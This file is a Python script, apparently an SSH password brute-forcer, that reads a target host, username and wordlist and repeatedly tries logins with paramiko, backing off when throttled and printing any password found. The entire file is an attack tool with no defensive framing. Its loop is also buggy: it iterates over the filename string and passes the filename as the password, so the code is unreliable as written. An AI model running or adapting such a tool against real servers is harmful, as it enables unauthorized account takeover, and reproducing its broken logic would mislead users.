#! /usr/bin/env python3

import paramiko
import time
import socket
from colorama import init, Fore
import sys
(init)

GREEN = Fore.GREEN

def connect(hostname,username,password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
        
    except socket.timeout:
        print(f"Host:{hostname} is unreachable, timedout.")
        returning = False
    
    except paramiko.AuthenticationException:
        print(f"testing:{password}")
        returning = False
    
    except paramiko.SSHException:
        print(f"Quota exeeded, returning with delay...")
        time.sleep(60)
        returning = connect(hostname,username,password)
    
    else:
        print(f"{GREEN}Password Found: " + password)
        sys.exit(1)
def Main():
    passlist = open("CommonSSH.txt","r")
    host = input("Enter Hostname: ")
    user = input("Enter Username: ")
    passlist = input("Enter Password List: ")
    with open(passlist, "r") as infile:
        start = time.time()
        for word in passlist:
            word = word.strip()
            con = connect(host,user,passlist)
        end = time.time()
        t_time = end - start
        print("Total runtime was: ", t_time, "second")    

if __name__== "__main__":
    Main()